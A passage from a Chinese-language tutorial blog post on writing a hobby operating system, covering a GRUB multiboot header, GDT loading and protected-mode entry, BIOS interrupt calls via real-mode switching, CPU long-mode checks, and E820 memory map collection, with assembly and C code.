设置图形模式</span><br><span class="line">@enduml</span><br></pre></td></tr></table></figure>
<p>下面开始细节的讲解。</p>
<h2 id="实现-GRUB-头"><a href="#实现-GRUB-头" class="headerlink" title="实现 GRUB 头"></a>实现 GRUB 头</h2><p>我们的 GRUB 头有两个文件组成，一个 <code>imginithead.asm</code> 汇编文件，它主要工作是初始化 CPU 的寄存器，加载 GDT，切换到 CPU 的保护模式；第二就是 <code>inithead.c</code> 文件，它的主要功能是查找二级引导器的核心文件 <code>initldrkrl.bin</code> ，然后把它放置到特定的内存地址上。</p>
<p>首先需要 GRUB1 和 GRUB2 两个头结构，这里不用去深究，按规范定义即可，代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">MBT_HDR_FLAGS  EQU 0x00010003</span><br><span class="line">MBT_HDR_MAGIC  EQU 0x1BADB002</span><br><span class="line">MBT2_MAGIC  EQU 0xe85250d6</span><br><span class="line">global _start</span><br><span class="line">extern inithead_entry</span><br><span class="line">[section .text]</span><br><span class="line">[bits 32]</span><br><span class="line">_start:</span><br><span class="line">  jmp _entry</span><br><span class="line">align 4</span><br><span class="line">mbt_hdr:</span><br><span class="line">  dd MBT_HDR_MAGIC</span><br><span class="line">  dd MBT_HDR_FLAGS</span><br><span class="line">  dd -(MBT_HDR_MAGIC+MBT_HDR_FLAGS)</span><br><span class="line">  dd mbt_hdr</span><br><span class="line">  dd _start</span><br><span class="line">  dd 0</span><br><span class="line">  dd 0</span><br><span class="line">  dd _entry</span><br><span class="line">ALIGN 8</span><br><span class="line">mbhdr:</span><br><span class="line">  DD  0xE85250D6</span><br><span class="line">  DD  0</span><br><span class="line">  DD  mhdrend - mbhdr</span><br><span class="line">  DD  -(0xE85250D6 + 0 + (mhdrend - mbhdr))</span><br><span class="line">  DW  2, 0</span><br><span class="line">  DD  24</span><br><span class="line">  DD  mbhdr</span><br><span class="line">  DD  _start</span><br><span class="line">  DD  0</span><br><span class="line">  DD  0</span><br><span class="line">  DW  3, 0</span><br><span class="line">  DD  12</span><br><span class="line">  DD  _entry </span><br><span class="line">  DD  0  </span><br><span class="line">  DW  0, 0</span><br><span class="line">  DD  8</span><br><span class="line">mhdrend:</span><br></pre></td></tr></table></figure>

<p>然后是关中断并加载 GDT ，代码如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_entry:</span><br><span class="line">    cli                            ; 关中断.</span><br><span class="line"></span><br><span class="line">    in al, 0x70                    </span><br><span class="line">    or al, 0x80    </span><br><span class="line">    out 0x70,al                    ; 读取 CMOS/RTC 地址，设置最高位为 1 ，写入 0x70 端口，关闭不可屏蔽中断.</span><br><span class="line"></span><br><span class="line">    lgdt [GDT_PTR]                 ; 加载 GDT 地址到 GDTR 寄存器</span><br><span class="line">    jmp dword 0x8 :_32bits_mode    ; 长跳转刷新 CS 影子寄存器</span><br><span class="line"></span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0                    ; 第一个段描述符CPU硬件规定必须为0</span><br><span class="line">kcode_dsc: dq 0x00cf9e000000ffff</span><br><span class="line">; [0000 0000]: 段基址:24~31</span><br><span class="line">; [1 1 0 0]: G:段长度的颗粒 1=4k,0=1b，D/B:操作数是否为32位，L:段是否64位模式，AVL: 系统待用</span><br><span class="line">; [1111]:段长度:16~19</span><br><span class="line">; [1 00 1 1 1 1 0] P:段是否在内存中，DPL:段描述符权限级别，S:段是系统段还是代码段和数据段，</span><br><span class="line">; T:代码段或数据段，C: 段是否可执行，R:段是否可读，A:段是否已经访问，由CPU自动设置</span><br><span class="line">; [0000 0000 0000 0000 0000 0000]:段基址0~23 </span><br><span class="line">; [1111 1111 1111 1111]:段长度:0~15</span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">k16cd_dsc: dq 0x00009e000000ffff	; 16位代码段描述符</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff	; 16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN	dw GDT_END-GDT_START-1	;GDT界限</span><br><span class="line">GDTBASE	dd GDT_START</span><br></pre></td></tr></table></figure>

<p>最后是初始化段寄存器和通用寄存器、栈寄存器，这是为了给调用 inithead_entry 这个 C 函数做准备，代码如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 初始化段寄存器和通用寄存器、栈寄存器，调用 C 函数。</span><br><span class="line">_32bits_mode:</span><br><span class="line">	mov ax, 0x10</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	xor eax,eax</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	xor ecx,ecx</span><br><span class="line">	xor edx,edx</span><br><span class="line">	xor edi,edi</span><br><span class="line">	xor esi,esi</span><br><span class="line">	xor ebp,ebp</span><br><span class="line">	xor esp,esp</span><br><span class="line">	mov esp,0x7c00				; 设置栈顶为 0x7c00</span><br><span class="line">	call inithead_entry			; 调用 inithead_entry 函数在 inithead.c 中实现</span><br><span class="line">	jmp 0x200000				; 跳转到 0x200000(2M) 地址，该地址放置的 initldrkrl.bin 文件</span><br></pre></td></tr></table></figure>

<p>下面我们接着看 C 函 inithead_entry 的功能，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MDC_ENDGIC 0xaaffaaffaaffaaff</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MDC_RVGIC 0xffaaffaaffaaffaa</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REALDRV_PHYADR 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMGFILE_PHYADR 0x4000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMGKRNL_PHYADR 0x2000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LDRFILEADR IMGFILE_PHYADR</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MLOSDSC_OFF (0x1000)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MRDDSC_ADR (mlosrddsc_t*)(LDRFILEADR+0x1000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">inithead_entry</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">write_realintsvefile</span>();</span><br><span class="line">    <span class="built_in">write_ldrkrlfile</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写initldrsve.bin文件到特定的内存中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_realintsvefile</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">fhdsc_t</span> *fhdscstart = <span class="built_in">find_file</span>(<span class="string">&quot;initldrsve.bin&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fhdscstart == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">error</span>(<span class="string">&quot;not file initldrsve.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">m2mcopy</span>((<span class="type">void</span> *)((<span class="type">u32_t</span>)(fhdscstart-&gt;fhd_intsfsoff) + LDRFILEADR),</span><br><span class="line">            (<span class="type">void</span> *)REALDRV_PHYADR, (<span class="type">sint_t</span>)fhdscstart-&gt;fhd_frealsz);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//写initldrkrl.bin文件到特定的内存中</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">write_ldrkrlfile</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">fhdsc_t</span> *fhdscstart = <span class="built_in">find_file</span>(<span class="string">&quot;initldrkrl.bin&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fhdscstart == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">error</span>(<span class="string">&quot;not file initldrkrl.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">m2mcopy</span>((<span class="type">void</span> *)((<span class="type">u32_t</span>)(fhdscstart-&gt;fhd_intsfsoff) + LDRFILEADR),</span><br><span class="line">            (<span class="type">void</span> *)ILDRKRL_PHYADR, (<span class="type">sint_t</span>)fhdscstart-&gt;fhd_frealsz);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//在映像文件中查找对应的文件</span></span><br><span class="line"><span class="function"><span class="type">fhdsc_t</span> *<span class="title">find_file</span><span class="params">(<span class="type">char_t</span> *fname)</span></span>&#123;</span><br><span class="line">    <span class="type">mlosrddsc_t</span> *mrddadrs = MRDDSC_ADR;</span><br><span class="line">    <span class="keyword">if</span> (mrddadrs-&gt;mdc_endgic != MDC_ENDGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_rv != MDC_RVGIC ||</span><br><span class="line">        mrddadrs-&gt;mdc_fhdnr &lt; <span class="number">2</span> ||</span><br><span class="line">        mrddadrs-&gt;mdc_filnr &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">error</span>(<span class="string">&quot;no mrddsc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">s64_t</span> rethn = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">fhdsc_t</span> *fhdscstart = (<span class="type">fhdsc_t</span> *)((<span class="type">u32_t</span>)(mrddadrs-&gt;mdc_fhdbk_s) + LDRFILEADR);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">u64_t</span> i = <span class="number">0</span>; i &lt; mrddadrs-&gt;mdc_fhdnr; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmpl</span>(fname, fhdscstart[i].fhd_name) == <span class="number">0</span>)&#123;</span><br><span class="line">            rethn = (<span class="type">s64_t</span>)i;</span><br><span class="line">            <span class="keyword">goto</span> ok_l;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    rethn = <span class="number">-1</span>;</span><br><span class="line">ok_l:</span><br><span class="line">    <span class="keyword">if</span> (rethn &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">error</span>(<span class="string">&quot;not find file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &amp;fhdscstart[rethn];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="进入二级引导器"><a href="#进入二级引导器" class="headerlink" title="进入二级引导器"></a>进入二级引导器</h2><p>在 <code>imginithead.asm</code> 的汇编文件中，最后一条指令 <code>jmp 0x200000</code> 将跳转到  <code>initldrkrl.bin</code> 存放的位置。</p>
<p>由于模块的改变，我们还需要写一小段汇编代码，建立下面这个 <code>ldrkrl32.asm</code> 文件，并写上如下代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 二级引导器核心入口汇编部分</span><br><span class="line">[bits 32]</span><br><span class="line"></span><br><span class="line">; 通过 imginithead.asm 中 jmp 0x200000 跳转过来。</span><br><span class="line">_start:</span><br><span class="line">_entry:</span><br><span class="line">	cli</span><br><span class="line">	lgdt [GDT_PTR]				; 加载 GDT 地址到 GDTR 寄存器  </span><br><span class="line">	lidt [IDT_PTR]				; 加载 IDT 地址到 IDTR 寄存器  </span><br><span class="line">	jmp dword 0x8 :_32bits_mode ; 长跳转刷新 CS 影子寄存器</span><br><span class="line"></span><br><span class="line">_32bits_mode:</span><br><span class="line">	mov ax, 0x10				; 数据段选择子(目的)</span><br><span class="line">	mov ds, ax</span><br><span class="line">	mov ss, ax</span><br><span class="line">	mov es, ax</span><br><span class="line">	mov fs, ax</span><br><span class="line">	mov gs, ax</span><br><span class="line">	xor eax,eax</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	xor ecx,ecx</span><br><span class="line">	xor edx,edx</span><br><span class="line">	xor edi,edi</span><br><span class="line">	xor esi,esi</span><br><span class="line">	xor ebp,ebp</span><br><span class="line">	xor esp,esp</span><br><span class="line">	mov esp,0x90000				; 使得栈底指向了 0x90000</span><br><span class="line">	call ldrkrl_entry			; 调用 ldrkrl_entry 函数</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	jmp 0x2000000				; 跳转到 0x2000000 的内存地址，这里存放着 kernel.bin</span><br><span class="line">	jmp $</span><br><span class="line">GDT_START:</span><br><span class="line">knull_dsc: dq 0</span><br><span class="line">kcode_dsc: dq 0x00cf9a000000ffff </span><br><span class="line">kdata_dsc: dq 0x00cf92000000ffff</span><br><span class="line">k16cd_dsc: dq 0x00009a000000ffff ; 16位代码段描述符</span><br><span class="line">; [0000 0000]: 段基址:24~31</span><br><span class="line">; [0000] G:段长度的颗粒 1=4k,0=1b，D/B:操作数是否为32位，L:段是否64位模式，AVL: 系统待用</span><br><span class="line">; [0000] 段长度:16~19</span><br><span class="line">; [1 00 1 1110] P:段是否在内存中，DPL:段描述符权限级别，S:段是系统段还是代码段和数据段，</span><br><span class="line">; T:代码段或数据段，C: 段是否可执行，R:段是否可读，A:段是否已经访问，又CPU自动设置</span><br><span class="line">; [000000000000000000000000] 段基址0~23 </span><br><span class="line">; [1111111111111111] 段长度:0~15</span><br><span class="line">k16da_dsc: dq 0x000092000000ffff ; 16位数据段描述符</span><br><span class="line">GDT_END:</span><br><span class="line"></span><br><span class="line">GDT_PTR:</span><br><span class="line">GDTLEN	dw GDT_END-GDT_START-1	;GDT界限</span><br><span class="line">GDTBASE	dd GDT_START</span><br><span class="line"></span><br><span class="line">IDT_PTR:</span><br><span class="line">IDTLEN	dw 0x3ff	; BIOS 中断表的长度</span><br><span class="line">IDTBAS	dd 0		; BIOS 中断表的地址</span><br></pre></td></tr></table></figure>
<p>加载 GDT 和 IDT 之后，最后将会调用 C 函数 ldrkrl_entry 函数。</p>
<h2 id="巧妙调用-BIOS-中断"><a href="#巧妙调用-BIOS-中断" class="headerlink" title="巧妙调用 BIOS 中断"></a>巧妙调用 BIOS 中断</h2><p>C 语言环境下调用 BIOS 中断，需要处理的问题如下：</p>
<ol>
<li>保存 C 语言环境下的 CPU 上下文 ，即保护模式下的所有通用寄存器、段寄存器、程序指针寄存器，栈寄存器，把它们都保存在内存中。</li>
<li>切换回实模式，调用 BIOS 中断，把 BIOS 中断返回的相关结果，保存在内存中。</li>
<li>切换回保护模式，重新加载第 1 步中保存的寄存器。这样 C 语言代码才能重新恢复执行。</li>
</ol>
<p>相关代码如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">realadr_call_entry:</span><br><span class="line">	pushad						; 保存通用寄存器</span><br><span class="line">	push    ds</span><br><span class="line">	push    es</span><br><span class="line">	push    fs</span><br><span class="line">	push    gs					; 保存4个段寄存器</span><br><span class="line">	call save_eip_jmp			; 调用save_eip_jmp</span><br><span class="line">	pop	gs</span><br><span class="line">	pop	fs</span><br><span class="line">	pop	es</span><br><span class="line">	pop	ds						; 恢复4个段寄存器</span><br><span class="line">	popad						; 恢复通用寄存器</span><br><span class="line">	ret</span><br><span class="line">save_eip_jmp:</span><br><span class="line">	pop esi						; 弹出 call save_eip_jmp 时保存的 eip 到 esi 寄存器中</span><br><span class="line">	mov [PM32_EIP_OFF],esi		; 把 eip 保存到特定的内存空间中</span><br><span class="line">	mov [PM32_ESP_OFF],esp		; 把 esp 保存到特定的内存空间中</span><br><span class="line">	jmp dword far [cpmty_mode]	; 长跳转这里表示把 cpmty_mode 处的第一个 4 字节装入 eip ，把其后的 2 字节装入 cs </span><br><span class="line">cpmty_mode:</span><br><span class="line">	dd 0x1000					; 内存中 0x1000 存放着 initldrsve.bin 文件</span><br><span class="line">	dw 0x18</span><br><span class="line">	jmp $</span><br></pre></td></tr></table></figure>
<p>这里需要解释一下 <code>jmp dword far [cpmty_mode]</code>，表示把 <code>[cpmty_mode]</code> 处的数据装入 <code>CS：EIP</code>，也就是把 <code>0x18：0x1000</code> 装入到 <code>CS：EIP</code> 中，这个 0x18 就是段描述索引，它正是指向 GDT 中的 16 位代码段描述符。</p>
<p>因为跳转到 16 位代码处执行，这里需要新建一个 16 位汇编文件 <code>realintsve.asm</code>，内容如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line">_start:</span><br><span class="line">_16_mode:</span><br><span class="line">	mov	bp,0x20					; 0x20 是指向 GDT 中的 16 位数据段描述符 </span><br><span class="line">	mov	ds, bp</span><br><span class="line">	mov	es, bp</span><br><span class="line">	mov	ss, bp</span><br><span class="line">	mov	ebp, cr0				</span><br><span class="line">	and	ebp, 0xfffffffe</span><br><span class="line">	mov	cr0, ebp				; CR0.P=0 关闭保护模式</span><br><span class="line">	jmp	0:real_entry			; 刷新CS影子寄存器，真正进入实模式</span><br><span class="line">real_entry:</span><br><span class="line">	mov bp, cs</span><br><span class="line">	mov ds, bp</span><br><span class="line">	mov es, bp</span><br><span class="line">	mov ss, bp					; 重新设置实模式下的段寄存器 都是 CS 中值，即为0 </span><br><span class="line">	mov sp, 08000h				; 设置栈</span><br><span class="line">	mov bp,func_table</span><br><span class="line">	add bp,ax					; 调用函数表中的汇编函数，ax 是 C 函数中传递进来的</span><br><span class="line">	call [bp]</span><br><span class="line">	cli</span><br><span class="line">	call disable_nmi</span><br><span class="line">	mov	ebp, cr0</span><br><span class="line">	or	ebp, 1</span><br><span class="line">	mov	cr0, ebp				; CR0.P=1 开启保护模式</span><br><span class="line">	jmp dword 0x8 :_32bits_mode</span><br><span class="line">[BITS 32]</span><br><span class="line">_32bits_mode:</span><br><span class="line">	mov bp, 0x10</span><br><span class="line">	mov ds, bp</span><br><span class="line">	mov ss, bp					; 重新设置保护模式下的段寄存器 0x10 是 32 位数据段描述符的索引</span><br><span class="line">	mov esi,[PM32_EIP_OFF]		; 加载先前保存的 EIP</span><br><span class="line">	mov esp,[PM32_ESP_OFF]		; 加载先前保存的 ESP</span><br><span class="line">	jmp esi						; 回到了 realadr_call_entry 函数中</span><br></pre></td></tr></table></figure>
<p>上述的代码的流程是这样的：首先从 _16_mode: 标号处进入实模式，然后根据传递进来（由 ax 寄存器传入）的函数号，到函数表中调用对应的函数，里面的函数执行完成后，再次进入保护模式，加载 EIP 和 ESP 寄存器从而回到 realadr_call_entry 函数中。GDT 还是 imginithead.asm 汇编代码文件中的 GDT，这没有变，因为它是由 GDTR 寄存器指向的。</p>
<h1 id="二级引导器主函数"><a href="#二级引导器主函数" class="headerlink" title="二级引导器主函数"></a>二级引导器主函数</h1><p>下面我们将进入二级引导器的主函数 ldrkrl_entry ，建立一个 C 文件 <code>ldrkrlentry.c</code>，在其中写上一个主函数，代码如下。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ldrkrl_entry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕显示</span></span><br><span class="line">    <span class="built_in">init_curs</span>();</span><br><span class="line">    <span class="built_in">close_curs</span>();</span><br><span class="line">    <span class="built_in">clear_screen</span>(VGADP_DFVL);</span><br><span class="line">    <span class="comment">// 初始化参数</span></span><br><span class="line">    <span class="built_in">init_bstartparm</span>();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最关键的函数就是 init_bstartparm，该函数功能为收集机器环境信息。</p>
<h3 id="检查与收集机器信息"><a href="#检查与收集机器信息" class="headerlink" title="检查与收集机器信息"></a>检查与收集机器信息</h3><p> init_bstartparm 函数负责管理检查 CPU 模式、收集内存信息，设置内核栈，设置内核字体、建立内核 MMU 页表数据。代码如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void init_bstartparm()</span><br><span class="line">&#123;</span><br><span class="line">    machbstart_t *mbsp = MBSPADR; // 1MB的内存地址</span><br><span class="line">    // 初始化 machbstart_t 结构体，清0,并设置一个标志</span><br><span class="line">    machbstart_t_init(mbsp);</span><br><span class="line">    // 检查 CPU</span><br><span class="line">    init_chkcpu(mbsp);</span><br><span class="line">    // 获取内存布局</span><br><span class="line">    init_mem(mbsp);</span><br><span class="line">    if (0 == get_wt_imgfilesz(mbsp))</span><br><span class="line">    &#123;</span><br><span class="line">        kerror(&quot;imgfilesz 0&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 初始化内核栈</span><br><span class="line">    init_krlinitstack(mbsp);</span><br><span class="line">    // 放置内核文件</span><br><span class="line">    init_krlfile(mbsp);</span><br><span class="line">    // 放置字体文件</span><br><span class="line">    init_defutfont(mbsp);</span><br><span class="line">    init_meme820(mbsp);</span><br><span class="line">    // 建立 MMU 页表数据</span><br><span class="line">    init_bstartpages(mbsp);</span><br><span class="line">    // 设置图形模式</span><br><span class="line">    init_graph(mbsp);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="检查CPU"><a href="#检查CPU" class="headerlink" title="检查CPU"></a>检查CPU</h2><p>首先要检查我们的 CPU，因为它是执行程序的关键。这里用两个函数 chk_cpuid、chk_cpu_longmode 来干两件事，一个是检查 CPU 否支持 CPUID 指令，然后另一个用 CPUID 指令检查 CPU 支持 64 位长模式。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过改写 eflags 寄存器的第 21 位，观察其位的变化判断是否支持 CPUID</span></span><br><span class="line"><span class="symbol">int</span> chk_cpuid() &#123;</span><br><span class="line">  int rets = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">      <span class="string">&quot;pushfl \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;popl %%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;movl %%eax,%%ebx \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;xorl $0x0200000,%%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;pushl %%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;popfl \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;pushfl \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;popl %%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;xorl %%ebx,%%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;jz 1f \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;movl $1,%0 \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;jmp 2f \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;1: movl $0,%0 \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;2: \n\t&quot;</span></span><br><span class="line">      : <span class="string">&quot;=c&quot;</span>(rets)</span><br><span class="line">      :</span><br><span class="line">      :)<span class="comment">;</span></span><br><span class="line">  return rets<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查CPU是否支持长模式</span></span><br><span class="line"><span class="symbol">int</span> chk_cpu_longmode() &#123;</span><br><span class="line">  int rets = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">  __asm__ __volatile__(</span><br><span class="line">      <span class="string">&quot;movl $0x80000000,%%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;cpuid \n\t&quot;</span>                      <span class="comment">// 把 eax 中放入 0x80000000 调用 CPUID 指令</span></span><br><span class="line">      <span class="string">&quot;cmpl $0x80000001,%%eax \n\t&quot;</span>     <span class="comment">// 看eax中返回结果</span></span><br><span class="line">      <span class="string">&quot;setnb %%al \n\t&quot;</span>                 <span class="comment">// 不为0x80000001,则不支持0x80000001号功能</span></span><br><span class="line">      <span class="string">&quot;jb 1f \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;movl $0x80000001,%%eax \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;cpuid \n\t&quot;</span>                      <span class="comment">// 把eax中放入0x800000001调用CPUID指令，检查edx中的返回数据</span></span><br><span class="line">      <span class="string">&quot;bt $29,%%edx  \n\t&quot;</span>              <span class="comment">// 长模式 支持位 是否为1</span></span><br><span class="line">      <span class="string">&quot;setcb %%al \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;1: \n\t&quot;</span></span><br><span class="line">      <span class="string">&quot;movzx %%al,%%eax \n\t&quot;</span></span><br><span class="line">      : <span class="string">&quot;=a&quot;</span>(rets)</span><br><span class="line">      :</span><br><span class="line">      :)<span class="comment">;</span></span><br><span class="line">  return rets<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 检查CPU主函数</span></span><br><span class="line"><span class="symbol">void</span> init_chkcpu(machbstart_t *mbsp) &#123;</span><br><span class="line">  <span class="meta">if</span> (!chk_cpuid()) &#123;</span><br><span class="line">    kerror(<span class="string">&quot;Your CPU is not support CPUID sys is die!&quot;</span>)<span class="comment">;</span></span><br><span class="line">    CLI_HALT()<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="meta">if</span> (!chk_cpu_longmode()) &#123;</span><br><span class="line">    kerror(<span class="string">&quot;Your CPU is not support 64bits mode sys is die!&quot;</span>)<span class="comment">;</span></span><br><span class="line">    CLI_HALT()<span class="comment">;</span></span><br><span class="line">  &#125;</span><br><span class="line">  mbsp-&gt;mb_cpumode = <span class="number">0x40</span><span class="comment">;  // 如果成功则设置机器信息结构的cpu模式为64位</span></span><br><span class="line">  return<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要你留意的是，最后设置机器信息结构中的 <code>mb_cpumode</code> 字段为 64, <code>mbsp</code> 正是传递进来的机器信息 <code>machbstart_t</code> 结构体的指针。</p>
<h2 id="获取内存布局"><a href="#获取内存布局" class="headerlink" title="获取内存布局"></a>获取内存布局</h2><p>物理内存在物理地址空间中是一段一段的，描述一段内存有一个数据结构，如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RAM_USABLE  1 <span class="comment">// 可用内存</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAM_RESERV  2 <span class="comment">// 保留内存不可使用</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAM_ACPIREC 3 <span class="comment">// ACPI表相关的</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAM_ACPINVS 4 <span class="comment">// ACPI NVS空间</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RAM_AREACON 5 <span class="comment">// 包含坏内存</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_e820</span>&#123;</span><br><span class="line">    <span class="type">u64_t</span> saddr;    <span class="comment">// 内存开始地址</span></span><br><span class="line">    <span class="type">u64_t</span> lsize;    <span class="comment">// 内存大小</span></span><br><span class="line">    <span class="type">u32_t</span> type;     <span class="comment">// 内存类型</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">e820map_t</span>;</span><br></pre></td></tr></table></figure>
<p>获取内存布局信息就是获取这个结构体的数组，下面我们需要获取上述结构体数组，并检查内存大小。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ETYBAK_ADR 0x2000            <span class="comment">// 8KB</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PM32_EIP_OFF (ETYBAK_ADR)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PM32_ESP_OFF (ETYBAK_ADR+4)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E80MAP_NR (ETYBAK_ADR+64)     <span class="comment">// 保存e820map_t结构数组元素个数的地址</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> E80MAP_ADRADR (ETYBAK_ADR+68) <span class="comment">// 保存e820map_t结构数组的开始地址</span></span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_mem</span><span class="params">(<span class="type">machbstart_t</span> *mbsp)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// e820map 结构数组首地址</span></span><br><span class="line">  <span class="type">e820map_t</span> *retemp;</span><br><span class="line">  <span class="comment">// 个数</span></span><br><span class="line">  <span class="type">u32_t</span> retemnr = <span class="number">0</span>;</span><br><span class="line">  mbsp-&gt;mb_ebdaphyadr = <span class="built_in">acpi_get_bios_ebda</span>();</span><br><span class="line">  <span class="built_in">mmap</span>(&amp;retemp, &amp;retemnr);</span><br><span class="line">  <span class="keyword">if</span> (retemnr == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">kerror</span>(<span class="string">&quot;no e820map\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// //根据 e820map_t 结构数据检查内存大小</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chk_memsize</span>(retemp, retemnr, <span class="number">0x100000</span>, <span class="number">0x8000000</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="built_in">kerror</span>(</span><br><span class="line">        <span class="string">&quot;Your computer is low on memory, the memory cannot be less than &quot;</span></span><br><span class="line">        <span class="string">&quot;128MB!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 把e820map_t结构数组的首地址传给mbsp-&gt;mb_e820padr</span></span><br><span class="line">  mbsp-&gt;mb_e820padr = (<span class="type">u64_t</span>)((<span class="type">u32_t</span>)(retemp));</span><br><span class="line">  <span class="comment">// 把e820map_t结构数组元素个数传给mbsp-&gt;mb_e820nr</span></span><br><span class="line">  mbsp-&gt;mb_e820nr = (<span 